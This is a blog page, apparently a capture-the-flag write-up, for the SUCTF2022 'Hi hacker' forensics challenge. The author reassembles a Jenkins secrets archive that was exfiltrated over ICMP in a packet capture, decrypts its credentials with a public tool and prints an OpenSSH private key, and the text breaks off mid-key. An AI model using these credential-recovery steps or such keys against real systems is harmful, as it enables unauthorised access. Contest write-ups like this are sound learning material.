@@ -1,0 +1,2293 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Misc Hi hacker 下载到是一个流量包，分析tcp流，发现是一个后面执行命令的 这里有一个文件jenkins_secret.zip 看下一个包里面，他进行了这'>
+<title>[SUCTF2022] WP</title>
+
+<link rel='canonical' href='https://example.com/post/suctf2022/'>
+
+<link rel="stylesheet" href="/scss/style.min.a50aba51166dc5bc1c208df7b60653be38aa0ed7b643534462b6f2a9afb0a257.css"><meta property='og:title' content='[SUCTF2022] WP'>
+<meta property='og:description' content='Misc Hi hacker 下载到是一个流量包，分析tcp流，发现是一个后面执行命令的 这里有一个文件jenkins_secret.zip 看下一个包里面，他进行了这'>
+<meta property='og:url' content='https://example.com/post/suctf2022/'>
+<meta property='og:site_name' content='Huamang'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-03-28T18:35:14&#43;08:00'/><meta property='article:modified_time' content='2022-03-28T18:35:14&#43;08:00'/>
+<meta name="twitter:title" content="[SUCTF2022] WP">
+<meta name="twitter:description" content="Misc Hi hacker 下载到是一个流量包，分析tcp流，发现是一个后面执行命令的 这里有一个文件jenkins_secret.zip 看下一个包里面，他进行了这">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2c79bb77476a4f0f53420443e9db5bfa_18691_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Huamang</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Huamang'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/Huamang7'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#misc">Misc</a>
+      <ol>
+        <li><a href="#hi-hacker">Hi hacker</a></li>
+        <li><a href="#月圆之夜">月圆之夜</a></li>
+        <li><a href="#什么奇奇怪怪的东西">什么奇奇怪怪的东西</a></li>
+        <li><a href="#au5t1n的秘密">Au5t1n的秘密</a></li>
+      </ol>
+    </li>
+    <li><a href="#web">Web</a>
+      <ol>
+        <li><a href="#ezpop">ezpop</a></li>
+        <li><a href="#calc">calc</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #fc2828; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/suctf2022/">[SUCTF2022] WP</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 28, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="misc">Misc</h1>
+<h2 id="hi-hacker">Hi hacker</h2>
+<p>下载到是一个流量包，分析tcp流，发现是一个后面执行命令的</p>
+<p><img src="https://img-blog.csdnimg.cn/31f69f8f494c40a4938976798d58b400.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>这里有一个文件jenkins_secret.zip</p>
+<p><img src="https://img-blog.csdnimg.cn/f4c4a204b8b5494e80e0508db64ae52b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>看下一个包里面，他进行了这样的操作</p>
+<p><img src="https://img-blog.csdnimg.cn/9c9b9bd91f384f7ba52a6bed07ac255c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>这看起来像是把文件发送的一个作用</p>
+<p><img src="https://img-blog.csdnimg.cn/97384b96e58343e89e91215735eaae25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>分析icmp协议，找到这个secret文件</p>
+<p><img src="https://img-blog.csdnimg.cn/df754b54cb2b496d8479e51a5677dc96.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>压缩文件是损坏的</p>
+<p><img src="https://img-blog.csdnimg.cn/b46fa3603f3c4256ae1c2f9e13643924.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_13,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>binwalk分离一些，修复一下压缩包，总共就弄到了这些东西，还差了一些xml文件</p>
+<p><img src="https://img-blog.csdnimg.cn/52ad9b5d33854440a0cf137b740478d5.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>这些应该是什么某种加密
+这个是java的一个类似于插件的一个东西</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">org.jenkinsci.main.modules.instance_identity
+</code></pre></td></tr></table>
+</div>
+</div><p>github：https://github.com/jenkinsci/instance-identity-plugin</p>
+<p>在github搜了一下，找到了几个对应的文件</p>
+<p><img src="https://img-blog.csdnimg.cn/d1c6bbe128784ec7acd7a92e42bcf789.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>找到了一个jenkins的解密的一个项目
+<a class="link" href="https://github.com/hoto/jenkins-credentials-decryptor"  target="_blank" rel="noopener"
+    >https://github.com/hoto/jenkins-credentials-decryptor</a></p>
+<p><img src="https://img-blog.csdnimg.cn/c97ad626cf0045a4b693c53247966a5e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>这几个文件在流量包里都能找到，但是xml文件一直提取不出来
+他发送是只是一个数据包，但是这里他分了四块去传输，这样数据混乱了，我无法将他们重新拼接起来，不知道是从哪里断的
+找了一下规律，第一个应该是由PK来开头的，猜测数据应该是由这里开始</p>
+<p><img src="https://img-blog.csdnimg.cn/6f43461b773548e691b3482b3220cd13.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>每一个文件结尾都有个，猜测也是icmp传输的某个格式文本</p>
+<p><img src="https://img-blog.csdnimg.cn/189ba30a3bbb4f80a3a727735990f798.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>而且只有最后第565个包里面是有压缩文件尾的，504b0506</p>
+<p><img src="https://img-blog.csdnimg.cn/b2a4cb64ad5044588c2e32fa704a142b.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>所以我猜测是四个拼接起来合成完整的zip文件
+我尝试和了一下，用winrar修复了一下</p>
+<p><img src="https://img-blog.csdnimg.cn/a085b0f18f994fb2a654cbacabcde722.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+>
+<img src="https://img-blog.csdnimg.cn/df5cec5e4a6d4a55baaaa0c902bb2c9f.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>差一个global_config.xml，而且xml文件还是处于损坏状态，无法提取。。。
+脱出四个分块，放一起对比一下，相同的尾</p>
+<p><img src="https://img-blog.csdnimg.cn/6fbd7cd96af644f180b97eb3edfe9dc1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+>
+<img src="https://img-blog.csdnimg.cn/3b2198d746da4379b69f4b50ee419d64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>拼了很久很久发现，漏了几个包
+主要看这里</p>
+<p><img src="https://img-blog.csdnimg.cn/c7d048ac764c492ba8b94f1c0b073d61.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>过滤一下<code>(icmp.ident == 135) &amp;&amp; (ip.src == 172.17.0.2)</code>
+把8个包的data流拿出来，去掉头部和尾部再拼接</p>
+<p><img src="https://img-blog.csdnimg.cn/2c89bd2ed5614f51b1f5b02cdeb5ab1d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>终于得到了完好的压缩包，xml文件算是拿到了</p>
+<p><img src="https://img-blog.csdnimg.cn/a431420fed634f3a8e061d81c84d709a.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>然后就是用刚才的工具</p>
+<p><img src="https://img-blog.csdnimg.cn/e6e67705c8424a57b3049fdebc2d18cf.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>解密得到一个github是ssh私钥</p>
+<p><img src="https://img-blog.csdnimg.cn/c3f852beac894a859c0e95c4b0a11430.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>还有一个hint</p>
+<p><img src="https://img-blog.csdnimg.cn/189c8cd2ba0d4102900488e45f62a69d.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>这里获取了ssh的私钥</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">-----</span><span class="nx">BEGIN</span> <span class="nx">OPENSSH</span> <span class="k">PRIVATE</span> <span class="nx">KEY</span><span class="o">-----</span>
+<span class="nx">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="nx">NhAAAAAwEAAQAAAYEAtzlKieML</span><span class="o">/</span><span class="mi">0</span><span class="nx">Tx0BJe15gk</span><span class="o">/</span><span class="nx">afiGikfhN4FP7BSaqdP74gcjre</span><span class="o">/</span><span class="nx">nAsI</span>
+<span class="nx">Ydl</span><span class="o">/</span><span class="nx">TOVDd9OpG7hwOTUZnITF9j</span><span class="o">/</span><span class="nx">jzT32HIhek9oqxLFVQT59zqN1ZDIZmhSVMNRWqWw3</span><span class="o">/</span><span class="nx">q</span>
+<span class="nx">vF9OHneBShkC1r63g</span><span class="o">/</span><span class="nx">W57chXU6Lg8jWyC</span><span class="o">+</span><span class="nx">UycgAJOlsEPhuTb2mfD75h</span><span class="o">/</span><span class="nx">Nq2</span><span class="o">++</span><span class="nx">CDX3g72H</span>
+<span class="nx">eHQFEJYqDYZmeQOmRV</span><span class="o">+</span><span class="nx">GmNuVKWXnG0EkyT</span><span class="o">/</span><span class="nx">MZ</span><span class="o">+</span><span class="mi">0</span><span class="nx">sqxU022eX4Nn5DhwKO79zfjpaAN9z9a</span>
+<span class="nx">iCmVqeZLMVJZEuZ9s7MwrQ</span><span class="o">/</span><span class="nx">tN8ov3lvG2QF5EafAoetgj1sKr65YnojT9K3Cn27S4Sl41I</span>
+<span class="nx">PVJtCUOxGc9QUmjPH3L7h4Tfy8lPwyl65jWgx</span><span class="o">/</span><span class="nx">BHDvuco3f0</span><span class="o">/</span><span class="nx">jYFqw2xVEORwuED93MnaA</span>
+<span class="nx">IooUY2hUAVAVupY3MaByn2cPnZa6Ujhs6jr2</span><span class="o">+</span><span class="nx">UKQPfAysnIWA9Gnr</span><span class="o">/</span><span class="nx">IH8xzzujt9Fg1zdl</span>
+<span class="nx">qmirVsw</span><span class="o">+</span><span class="nx">eKi070HbZbDtdKbV3ob</span><span class="o">/</span><span class="nx">smaqZ6lnvKzXAAAFiNRQaKnUUGipAAAAB3NzaC1yc2</span>
+<span class="nx">EAAAGBALc5SonjC</span><span class="o">/</span><span class="mf">9E8</span><span class="nx">dASXteYJP2n4hopH4TeBT</span><span class="o">+</span><span class="nx">wUmqnT</span><span class="o">++</span><span class="nx">IHI63v5wLCGHZf0zlQ3fT</span>
+<span class="nx">qRu4cDk1GZyExfY</span><span class="o">/</span><span class="mi">48099</span><span class="nx">hyIXpPaKsSxVUE</span><span class="o">+</span><span class="nx">fc6jdWQyGZoUlTDUVqlsN</span><span class="o">/</span><span class="mi">6</span><span class="nx">rxfTh53gUoZ</span>
+<span class="nx">Ata</span><span class="o">+</span><span class="nx">t4P1ue3IV1Oi4PI1sgvlMnIACTpbBD4bk29pnw</span><span class="o">++</span><span class="nx">Yfzatvvgg194O9h3h0BRCWKg2G</span>
+<span class="nx">ZnkDpkVfhpjblSll5xtBJMk</span><span class="o">/</span><span class="nx">zGftLKsVNNtnl</span><span class="o">+</span><span class="nx">DZ</span><span class="o">+</span><span class="nx">Q4cCju</span><span class="o">/</span><span class="nx">c346WgDfc</span><span class="o">/</span><span class="nx">WogplanmSzFS</span>
+<span class="nx">WRLmfbOzMK0P7TfKL95bxtkBeRGnwKHrYI9bCq</span><span class="o">+</span><span class="nx">uWJ6I0</span><span class="o">/</span><span class="nx">Stwp9u0uEpeNSD1SbQlDsRnP</span>
+<span class="nx">UFJozx9y</span><span class="o">+</span><span class="mi">4</span><span class="nx">eE38vJT8MpeuY1oMfwRw77nKN39P42BasNsVRDkcLhA</span><span class="o">/</span><span class="nx">dzJ2gCKKFGNoVAFQ</span>
+<span class="nx">FbqWNzGgcp9nD52WulI4bOo69vlCkD3wMrJyFgPRp6</span><span class="o">/</span><span class="nx">yB</span><span class="o">/</span><span class="nx">Mc87o7fRYNc3Zapoq1bMPnio</span>
+<span class="nx">tO9B22Ww7XSm1d6G</span><span class="o">/</span><span class="mi">7</span><span class="nx">JmqmepZ7ys1wAAAAMBAAEAAAGAO0ci0XeOgxj4LvwyiQflN9ef9B</span>
+<span class="nx">zH4MG</span><span class="o">/</span><span class="mi">6</span><span class="nx">voNwAm</span><span class="o">/</span><span class="nx">d9yOeLIEIOUE4jtuzx8Bc</span><span class="o">/</span><span class="nx">wboydJz4hZb</span><span class="o">+</span><span class="nx">UY8vF6rwVT4alRB</span><span class="o">/</span><span class="mi">62</span><span class="nx">hYpl</span>
+<span class="mi">7</span><span class="nx">cTdCQSjTzZSSCJOnkykeQ3VE</span><span class="o">+</span><span class="nx">TZF8AaliP</span><span class="o">+</span><span class="nx">nVnEp5rwzKCZ8eeaWhp1st7mFJr85JLgMS</span>
+<span class="nx">XVGooowGdR6AL0FHoDfj6PhKTF9nd6yAH9OwD3mEFRAvLD5iJsoMciPRQXZbDpXdpC8Frd</span>
+<span class="nx">Dfr3DT0YMbNqsCfhor4XoioPpufNisF1BFyx</span><span class="o">+</span><span class="nx">Gv7M</span><span class="o">+</span><span class="nx">qj7RW1RRfG5</span><span class="o">/</span><span class="nx">LxRqCUx7eCjkPXr2</span>
+<span class="nx">l777fOVsnOTcIEea9NTjdD</span><span class="o">/</span><span class="nx">tacmvAgzj4jcMgnJmcQ46uAaQame1mPuanb8xMXj</span><span class="o">+</span><span class="nx">Hmbtv3</span>
+<span class="nx">Oet19bEmEuZiKOQuBPrwAhC</span><span class="o">/</span><span class="nx">m2bhSPQyQcYbtfMVUCpakVp73y4</span><span class="o">+</span><span class="mi">5</span><span class="nx">o6CCx6sQJ4mCJZ25J</span>
+<span class="mi">28</span><span class="nx">AXC4tibWHJVtyceB8pP</span><span class="o">/</span><span class="nx">KZri</span><span class="o">+</span><span class="nx">vEaYfeCOVl756H8</span><span class="o">+</span><span class="nx">QjrItlGs7BfDUa9cwwbGBThAAAA</span>
+<span class="nx">wHSyot2RhNL4R6T0xFEMg8DT62U44IiME9xWZUnQ2xvjYApcLN4ekD8kWF</span><span class="o">+</span><span class="nx">CLe64eMie2j</span>
+<span class="nx">I</span><span class="o">/</span><span class="nx">veZUjRj</span><span class="o">++</span><span class="nx">va</span><span class="o">+</span><span class="mi">1</span><span class="nx">SEzXIPOZfq17xNRPr6IvOhiE1cG9EcmFyHEVRzDKP63qf7VhMkMYl2W</span>
+<span class="nx">UENdNAjvv</span><span class="o">/</span><span class="nx">QMlEXluhpFdOVVwp</span><span class="o">/</span><span class="mi">5</span><span class="nx">dtcXmU6tXZRtONsNbKAXRC9mdYVS</span><span class="o">/</span><span class="nx">bueVRQ1EfVRo1</span>
+<span class="o">+</span><span class="nx">iFzM</span><span class="o">+</span><span class="nx">vIBbZsbrhGW1azJlwfBi3246NKdNhO8pgUnJ2Cb2vgAAAMEA31y2aFETbHi0jtdT</span>
+<span class="nx">scjJ</span><span class="o">+</span><span class="nx">MnFkwe2T84ryGNBuI5N</span><span class="o">+</span><span class="mi">5</span><span class="nx">N1ak8zBDf0FIicWisLdVHpZBReTnCvAhO8B2782HaLkp</span>
+<span class="nx">beidDDsO7s34bixoIeAQ0nDpVEDh6EKAj3bKZu7O76Ka6YqpE</span><span class="o">/</span><span class="nx">sHNBe7gS7ARFLTuqrZEN</span>
+<span class="nx">G6LoGK3S</span><span class="o">+</span><span class="mi">7</span><span class="nx">p4kAiAfM6iK9X9tbdWt67zKGF3RjB0OZb1iuyBuQNo087DRkB</span><span class="o">/</span><span class="nx">J227NXBzZ</span><span class="o">+</span>
+<span class="nx">TazxuPVPPxM</span><span class="o">/</span><span class="nx">tB6T89MQli0ZKkik</span><span class="o">/</span><span class="nx">xAAAAwQDR</span><span class="o">/</span><span class="nx">yBmgb9WnxmW3GpsVXd5tQM3pqOaQNoA</span>
